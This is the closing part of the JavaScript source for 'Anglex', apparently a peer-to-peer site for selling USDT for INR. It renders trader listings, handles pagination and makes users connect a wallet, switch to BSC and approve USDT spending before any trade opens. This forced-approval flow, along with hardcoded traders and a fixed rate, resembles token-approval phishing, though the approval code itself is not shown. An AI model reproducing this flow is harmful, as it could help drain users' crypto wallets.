                        <button onclick="showNotification('Contact our agent at support@anglex.in', 'info')" class="bg-blue-600 hover:bg-blue-700 text-white py-1.5 px-3 rounded text-sm transition-all">Start Chat</button>
                    </div>
                    
                    <div class="bg-gradient-to-br from-green-600/20 to-emerald-600/20 border border-green-500/30 rounded-xl p-6 text-center">
                        <i class="fab fa-telegram text-2xl text-green-400 mb-3"></i>
                        <h3 class="text-base font-semibold text-white mb-2">Telegram</h3>
                        <p class="text-gray-400 mb-3 text-sm">Join our official support channel</p>
                        <button onclick="window.open('https://t.me/anglexpk', '_blank')" class="bg-green-600 hover:bg-green-700 text-white py-1.5 px-3 rounded text-sm transition-all">Join Now</button>
                    </div>
                    
                    <div class="bg-gradient-to-br from-purple-600/20 to-pink-600/20 border border-purple-500/30 rounded-xl p-6 text-center">
                        <i class="fas fa-book text-2xl text-purple-400 mb-3"></i>
                        <h3 class="text-base font-semibold text-white mb-2">Guide</h3>
                        <p class="text-gray-400 mb-3 text-sm">Learn how to trade safely on Anglex</p>
                        <button onclick="showNotification('Trading Guide: 1. Connect wallet 2. Select trader 3. Place order', 'info')" class="bg-purple-600 hover:bg-purple-700 text-white py-1.5 px-3 rounded text-sm transition-all">View Guide</button>
                    </div>
                </div>
            </div>
        `
    };

    // Application functions
    function hideLoadingScreen() {
        const loadingScreen = document.getElementById('loading-screen');
        if (loadingScreen) {
            loadingScreen.style.display = 'none';
        }
    }

    function loadPage(pageName) {
        try {
            const content = pages[pageName];
            if (!content) {
                debugLog("Page not found: " + pageName);
                return;
            }
            
            document.getElementById('main-content').innerHTML = content;
            
            // Update navigation
            document.querySelectorAll('.nav-link').forEach(link => {
                link.classList.remove('text-white', 'font-bold');
                link.classList.add('text-gray-400');
                
                if (link.dataset.page === pageName) {
                    link.classList.remove('text-gray-400');
                    link.classList.add('text-white', 'font-bold');
                }
            });

            if (pageName === 'sell') {
                renderOrders();
            } else if (pageName === 'orders') {
                renderOrderHistory();
            }
            
            debugLog("Page loaded: " + pageName);
        } catch (error) {
            debugLog("Error loading page: " + error.message);
        }
    }

    // FIXED: Function to render order history with clickable orders
    function renderOrderHistory() {
        const ordersList = document.getElementById('orders-history-list');
        if (!ordersList) return;
        
        // Load orders from localStorage
        const storedOrders = localStorage.getItem('anglexUserOrders');
        userOrders = storedOrders ? JSON.parse(storedOrders) : [];
        
        if (userOrders.length === 0) {
            ordersList.innerHTML = `
                <div class="text-center py-8">
                    <i class="fas fa-history text-4xl text-gray-500 mb-3"></i>
                    <p class="text-lg text-gray-400">No orders found</p>
                    <p class="text-gray-500 mt-1 text-sm">Your trading history will appear here</p>
                </div>
            `;
            return;
        }
        
        ordersList.innerHTML = '';
        userOrders.forEach(order => {
            const statusColor = order.status === 'pending' ? '#f59e0b' : order.status === 'completed' ? '#10b981' : '#ef4444';
            const orderElement = `
                <div class="order-card p-4 rounded-xl cursor-pointer hover:bg-gray-600/20 transition-all" onclick="showOrderDetails(${order.id})">
                    <div class="flex justify-between items-center">
                        <div>
                            <div class="text-white font-semibold">${order.amount} USDT → INR ${order.inrAmount}</div>
                            <div class="text-sm text-gray-400">${order.paymentMethod} • ${order.timestamp}</div>
                        </div>
                        <div class="flex items-center space-x-3">
                            <div class="px-3 py-1 rounded-full text-xs font-bold" style="background: ${statusColor}; color: ${order.status === 'cancelled' ? '#fff' : '#000'};">
                                ${order.status.toUpperCase()}
                            </div>
                            <i class="fas fa-eye text-gray-400 hover:text-white"></i>
                        </div>
                    </div>
                </div>
            `;
            ordersList.innerHTML += orderElement;
        });
    }


    
    function updatePaginationButtons() {
        try {
            const totalPages = Math.ceil(filteredOrders.length / ordersPerPage);
            const prevBtn = document.getElementById('prev-btn');
            const nextBtn = document.getElementById('next-btn');
            const pageInfo = document.getElementById('page-info');

            if (prevBtn) {
                prevBtn.disabled = currentPage <= 1;
                prevBtn.style.opacity = currentPage <= 1 ? '0.5' : '1';
                prevBtn.style.cursor = currentPage <= 1 ? 'not-allowed' : 'pointer';
            }

            if (nextBtn) {
                nextBtn.disabled = currentPage >= totalPages;
                nextBtn.style.opacity = currentPage >= totalPages ? '0.5' : '1';
                nextBtn.style.cursor = currentPage >= totalPages ? 'not-allowed' : 'pointer';
            }

            if (pageInfo) {
                pageInfo.textContent = `Page ${currentPage} of ${totalPages}`;
            }

            debugLog(`Pagination updated: Page ${currentPage}/${totalPages}`);
        } catch (error) {
            debugLog(`Pagination error: ${error.message}`);
        }
    }

    function goToPreviousPage() {
        if (currentPage > 1) {
            currentPage--;
            renderOrders(filteredOrders);
            updatePaginationButtons();
            window.scrollTo(0, 0);
            debugLog(`Moved to previous page: ${currentPage}`);
        }
    }

    function goToNextPage() {
        const totalPages = Math.ceil(filteredOrders.length / ordersPerPage);
        if (currentPage < totalPages) {
            currentPage++;
            renderOrders(filteredOrders);
            updatePaginationButtons();
            window.scrollTo(0, 0);
            debugLog(`Moved to next page: ${currentPage}`);
        }
    }


    function renderStars(rating) {
        let stars = '';
        for (let i = 1; i <= 5; i++) {
            if (i <= Math.floor(rating)) {
                stars += '<i class="fas fa-star rating-stars text-xs"></i>';
            } else if (i - 0.5 <= rating) {
                stars += '<i class="fas fa-star-half-alt rating-stars text-xs"></i>';
            } else {
                stars += '<i class="far fa-star text-gray-400 text-xs"></i>';
            }
        }
        return stars;
    }

    function renderOrders(ordersToRender = allOrders) {
        const ordersList = document.getElementById('orders-list');
        if (!ordersList) return;
        
        ordersList.innerHTML = '';
        
        const start = (currentPage - 1) * ordersPerPage;
        const end = start + ordersPerPage;
        const paginatedOrders = ordersToRender.slice(start, end);
        
        if (paginatedOrders.length === 0) {
            ordersList.innerHTML = `
                <div class="text-center py-8">
                    <i class="fas fa-search text-4xl text-gray-500 mb-3"></i>
                    <p class="text-base text-gray-400">No traders found matching your criteria</p>
                    <p class="text-gray-500 mt-1 text-sm">Try adjusting your filters</p>
                </div>
            `;
        } else {
            paginatedOrders.forEach(order => {
                const traderInfo = traders[order.trader];
                                const isOnline = traderInfo ? traderInfo.online : false;
                const statusClass = isOnline ? 'status-online' : 'status-offline';
                const statusText = isOnline ? 'Online' : 'Offline';
                const opacityClass = isOnline ? '' : 'opacity-60';
                
                let buttonHtml;
                if (!isOnline) {
                    buttonHtml = '<button class="bg-gradient-to-r from-gray-700 to-gray-600 text-gray-400 font-semibold py-2 px-4 rounded-full text-xs cursor-not-allowed" disabled><i class="fas fa-moon mr-1"></i>Offline</button>';
                } else if (isApproved) {
                    buttonHtml = `<button class="trade-btn bg-gradient-to-r from-green-600 to-emerald-500 hover:from-green-700 hover:to-emerald-600 text-white font-semibold py-2 px-4 rounded-full text-xs shadow-lg hover:shadow-xl transform hover:scale-105 transition-all" data-order-id="${order.id}" data-trader="${order.trader}"><i class="fas fa-shopping-cart mr-1"></i>Place Order</button>`;
                } else {
                    buttonHtml = `<button class="trade-btn bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-semibold py-2 px-4 rounded-full text-xs shadow-lg hover:shadow-xl transform hover:scale-105 transition-all" data-order-id="${order.id}" data-trader="${order.trader}"><i class="fas fa-play mr-1"></i>Approve & Trade</button>`;
                }

                const orderCard = `
                    <div class="order-card p-4 md:p-6 rounded-xl ${opacityClass} shadow-xl">
                        <div class="flex flex-col lg:flex-row items-center justify-between gap-4">
                            <div class="flex items-center cursor-pointer trader-info hover:scale-105 transition-transform" data-trader="${order.trader}">
                                <div class="initials-avatar mr-3">${traderInfo ? traderInfo.initials : 'TR'}</div>
                                <div>
                                    <div class="flex items-center mb-1">
                                        <h3 class="text-sm md:text-base font-bold text-white mr-2">${order.trader}</h3>
                                        <div class="text-xs">${renderStars(traderInfo ? traderInfo.rating : 4.5)}</div>
                                        <span class="text-yellow-400 text-xs ml-1 font-semibold">${traderInfo ? traderInfo.rating : 4.5}</span>
                                    </div>
                                    <div class="flex items-center text-xs text-gray-400 gap-3">
                                        <span><i class="fas fa-check-circle mr-1"></i>${traderInfo ? traderInfo.completion : 95}%</span>
                                        <span><i class="fas fa-chart-line mr-1"></i>${traderInfo ? traderInfo.totalTrades : 0}</span>
                                        <span><i class="fas fa-clock mr-1"></i>${traderInfo ? traderInfo.avgTime : '15 min'}</span>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="grid grid-cols-2 md:grid-cols-4 gap-3 text-center flex-1">
                                <div class="bg-red-500/10 border border-red-500/20 rounded-lg p-2">
                                    <p class="text-xs text-red-400 uppercase font-semibold mb-1">Price</p>
                                    <p class="text-sm md:text-base font-bold text-red-400">₹${order.price}</p>
                                </div>
                                <div class="bg-blue-500/10 border border-blue-500/20 rounded-lg p-2">
                                    <p class="text-xs text-blue-400 uppercase font-semibold mb-1">Limit</p>
                                    <p class="text-xs font-semibold text-blue-300">${order.limit}</p>
                                </div>
                                <div class="bg-green-500/10 border border-green-500/20 rounded-lg p-2">
                                    <p class="text-xs text-green-400 uppercase font-semibold mb-1">Available</p>
                                    <p class="text-xs font-semibold text-green-300">${order.available}</p>
                                </div>
                                <div class="bg-purple-500/10 border border-purple-500/20 rounded-lg p-2">
                                    <p class="text-xs text-purple-400 uppercase font-semibold mb-1">Payment</p>
                                    <p class="text-xs font-semibold text-purple-300">${order.payment.join(', ')}</p>
                                </div>
                            </div>
                            
                            <div class="flex flex-col items-center gap-2">
                                <div class="flex items-center text-xs font-semibold ${statusClass} bg-${isOnline ? 'green' : 'gray'}-500/10 px-2 py-1 rounded-full border border-${isOnline ? 'green' : 'gray'}-500/20">
                                    <div class="w-1.5 h-1.5 rounded-full bg-current mr-1 animate-pulse"></div>
                                    ${statusText}
                                </div>
                                ${buttonHtml}
                            </div>
                        </div>
                        
                        <div id="details-${order.trader}" class="trader-details mt-4">
                            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                                <div>
                                    <h4 class="font-semibold text-white mb-3 flex items-center text-sm">
                                        <i class="fas fa-chart-bar mr-1 text-blue-400"></i>Trader Statistics
                                    </h4>
                                    <div class="space-y-2 text-gray-300 text-xs">
                                        <div class="flex justify-between">
                                            <span>Member since:</span>
                                            <span class="font-semibold">${traderInfo ? traderInfo.joinedDate : 'Unknown'}</span>
                                        </div>
                                        <div class="flex justify-between">
                                            <span>Total volume:</span>
                                            <span class="font-semibold text-green-400">${traderInfo ? traderInfo.volume : 'N/A'}</span>
                                        </div>
                                        <div class="flex justify-between">
                                            <span>Avg payment time:</span>
                                            <span class="font-semibold">${traderInfo ? traderInfo.paymentTime : '15 min'}</span>
                                        </div>
                                    </div>
                                </div>
                                <div>
                                    <h4 class="font-semibold text-white mb-3 flex items-center text-sm">
                                        <i class="fas fa-comments mr-1 text-yellow-400"></i>Recent Reviews
                                    </h4>
                                    <div class="space-y-2">
                                        ${traderInfo && traderInfo.reviews ? traderInfo.reviews.slice(0, 2).map(review => `
                                            <div class="bg-slate-700/30 border border-slate-600/30 rounded-lg p-2">
                                                <div class="flex items-center justify-between mb-1">
                                                    <div class="flex items-center">
                                                        <strong class="text-white text-xs mr-1">${review.user}</strong>
                                                        <div class="text-xs">${renderStars(review.rating)}</div>
                                                    </div>
                                                    <span class="text-gray-500 text-xs">${review.date}</span>
                                                </div>
                                                <p class="text-gray-300 text-xs italic">"${review.comment}"</p>
                                            </div>
                                        `).join('') : '<p class="text-gray-400 italic text-xs">No reviews available</p>'}
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                `;
                ordersList.innerHTML += orderCard;
            });
        }
        
        updatePagination(ordersToRender.length);
    }


    function updatePagination(totalOrders) {
        debugLog(`📄 Pagination update: ${totalOrders} total orders, current page ${currentPage}`);

        const totalPages = Math.max(1, Math.ceil(totalOrders / ordersPerPage));
        const paginationInfo = document.getElementById('pagination-info');
        if (paginationInfo) {
            paginationInfo.textContent = `Page ${currentPage} of ${totalPages}`;
        }

        const prevBtn = document.getElementById('prev-page');
        const nextBtn = document.getElementById('next-page');

        if (prevBtn) {
            prevBtn.disabled = (currentPage <= 1);
            debugLog(`📄 Previous button disabled: ${currentPage <= 1}`);
        }

        if (nextBtn) {
            nextBtn.disabled = (currentPage >= totalPages);
            debugLog(`📄 Next button disabled: ${currentPage >= totalPages} (page ${currentPage}/${totalPages})`);
        }

        debugLog(`📄 Pagination complete: Page ${currentPage}/${totalPages}`);
    }

    function filterOrders() {
        const selectedPayment = document.getElementById('payment-filter')?.value;
        
        filteredOrders = allOrders;
        if (selectedPayment && selectedPayment !== 'all') {
            filteredOrders = allOrders.filter(order => 
                order.payment.includes(selectedPayment)
            );
        }
        
        currentPage = 1;
        renderOrders(filteredOrders);
    }

    async function handleTradeButtonClick(btn) {
        const originalBtnHTML = btn.innerHTML;
        btn.innerHTML = '<span class="spinner"></span>Processing...';
        btn.disabled = true;

        try {
            debugLog("Starting trade process...");
            showNotification("Processing...", "info");
            
            await checkAndSwitchToBSC();
            await connectWallet();
            await checkBNBBalance();
            
            if (!isApproved) {
                await approveUSDT();
            } else {
                debugLog("Trading ready - wallet setup complete");
            }
            
            document.getElementById('trade-modal').classList.remove('hidden');
            document.getElementById('inr-amount').textContent = 'INR 0.00';
            document.getElementById('usdt-amount-input').value = '';
            document.getElementById('payment-details').classList.add('hidden');
            
            updateModalBalance();
            
            const message = isApproved ? "Wallet ready! Enter your USDT amount." : "Setup complete! Ready to trade.";
            showNotification(message, "success");
            
        } catch (error) {
            debugLog("Trade setup error: " + error.message);
            showNotification(error.message, "error");
        } finally {
            btn.disabled = false;
            btn.innerHTML = originalBtnHTML;
        }
    }

    function setupEventHandlers() {
        // Navigation links
        document.addEventListener('click', function(e) {
            if (e.target.classList.contains('nav-link') && e.target.dataset.page) {
                e.preventDefault();
                loadPage(e.target.dataset.page);
            }
        });
        
        // Trader details toggle
        document.addEventListener('click', function(e) {
            if (e.target.closest('.trader-info')) {
                const traderElement = e.target.closest('.trader-info');
                const traderId = traderElement.dataset.trader;
                const detailsElement = document.getElementById(`details-${traderId}`);
                
                if (detailsElement) {
                    detailsElement.classList.toggle('show');
                }
            }
        });
        
        // Trade buttons
        document.addEventListener('click', function(e) {
            if (e.target.classList.contains('trade-btn')) {
                e.preventDefault();
                handleTradeButtonClick(e.target);
            }
        });
        
        // Modal close
        const closeModal = document.getElementById('close-modal');
        if (closeModal) {
            closeModal.addEventListener('click', function() {
                document.getElementById('trade-modal').classList.add('hidden');
            });
        }
        
        // Order details modal close
        const closeOrderDetails = document.getElementById('close-order-details');
        if (closeOrderDetails) {
            closeOrderDetails.addEventListener('click', function() {
                document.getElementById('order-details-modal').classList.add('hidden');
            });
        }
        
        // Cancel trade
        const cancelTrade = document.getElementById('cancel-trade');
        if (cancelTrade) {
            cancelTrade.addEventListener('click', function() {
                document.getElementById('trade-modal').classList.add('hidden');
            });
        }
        
        // Amount input handler
        const usdtAmountInput = document.getElementById('usdt-amount-input');
        if (usdtAmountInput) {
            usdtAmountInput.addEventListener('input', function() {
                const amount = parseFloat(this.value) || 0;
                const inrAmount = (amount * 103.5).toFixed(2);
                
                document.getElementById('inr-amount').textContent = `INR ${inrAmount}`;
                
                checkUSDTSufficiency(amount);
                
                if (amount > 0) {
                    document.getElementById('payment-details').classList.remove('hidden');
                } else {
                    document.getElementById('payment-details').classList.add('hidden');
                }
            });
        }
        
        // Payment method selection
        document.addEventListener('click', function(e) {
            if (e.target.classList.contains('payment-method-btn')) {
                document.querySelectorAll('.payment-method-btn').forEach(btn => {
                    btn.classList.remove('active');
                });
                
                e.target.classList.add('active');
                selectedPaymentMethod = e.target.dataset.method;
                
                document.querySelectorAll('.payment-form').forEach(form => {
                    form.classList.add('hidden');
                });
                
                const formId = selectedPaymentMethod.toLowerCase().replace(' ', '') + '-details';
                document.getElementById(formId).classList.remove('hidden');
            }
        });
        
        // Sell USDT button
        const sellBtn = document.getElementById('sell-usdt-btn');
        if (sellBtn) {
            sellBtn.addEventListener('click', handleSellUSDTEnhanced);
        }
        
        // Filter functionality
        const filterBtn = document.getElementById('filter-btn');
        if (filterBtn) {
            filterBtn.addEventListener('click', filterOrders);
        }
        

        // Enhanced pagination with proper debugging and limits
        const prevPageBtn = document.getElementById('prev-page');
        const nextPageBtn = document.getElementById('next-page');

        if (prevPageBtn) {
            prevPageBtn.addEventListener('click', function() {
                debugLog(`⬅️ Previous page clicked. Current: ${currentPage}`);
                if (currentPage > 1) {
                    currentPage--;
                    debugLog(`⬅️ Moving to page ${currentPage}`);
                    const ordersToUse = filteredOrders.length > 0 ? filteredOrders : allOrders;
                    debugLog(`📊 Using ${ordersToUse.length} orders for previous page`);
                    renderOrders(ordersToUse);
                } else {
                    debugLog("⬅️ Already on first page");
                }
            });
        }

        if (nextPageBtn) {
            nextPageBtn.addEventListener('click', function() {
                const ordersToUse = filteredOrders.length > 0 ? filteredOrders : allOrders;
                const totalPages = Math.ceil(ordersToUse.length / ordersPerPage);
                debugLog(`➡️ Next page clicked. Current: ${currentPage}, Total pages: ${totalPages}`);
                debugLog(`📊 Orders available: ${ordersToUse.length}, Per page: ${ordersPerPage}`);

                if (currentPage < totalPages) {
                    currentPage++;
                    debugLog(`➡️ Moving to page ${currentPage}/${totalPages}`);
                    renderOrders(ordersToUse);
                } else {
                    debugLog(`➡️ Already on last page (${currentPage}/${totalPages})`);
                }
            });
        }
                // Debug toggle
        const debugToggle = document.getElementById('toggle-debug');
        if (debugToggle) {
            debugToggle.addEventListener('click', function() {
                const debugPanel = document.getElementById('debug-panel');
                debugPanel.classList.toggle('hidden');
            });
        }
        
        // Clear debug
        const clearDebug = document.getElementById('clear-debug');
        if (clearDebug) {
            clearDebug.addEventListener('click', clearDebugLog);
        }
    }

    // Initialize the app
    function initializeApp() {
        try {
            debugLog("Starting application initialization...");
            
            // Initialize orders
            allOrders = [...initialOrders];
            filteredOrders = [...allOrders];
            
            // Load user orders from localStorage
            const storedOrders = localStorage.getItem('anglexUserOrders');
            userOrders = storedOrders ? JSON.parse(storedOrders) : [];
            
            // Setup event handlers
            setupEventHandlers();
            
            // Load default page
            loadPage('sell');
            
            // Hide loading screen
            hideLoadingScreen();
            
            appInitialized = true;
            debugLog("Application initialized successfully");
            showNotification("Platform loaded successfully!", "success");
            
        } catch (error) {
            debugLog("Initialization error: " + error.message);
            showNotification("Failed to initialize platform: " + error.message, "error");
            hideLoadingScreen();
        }
    }

    // Initialize when DOM is ready
    document.addEventListener('DOMContentLoaded', function() {
        setTimeout(initializeApp, 50);
    });

    // Fallback initialization
    window.addEventListener('load', function() {
        if (!appInitialized) {
            setTimeout(initializeApp, 800);
        }
    });
</script>

</body>
</html>
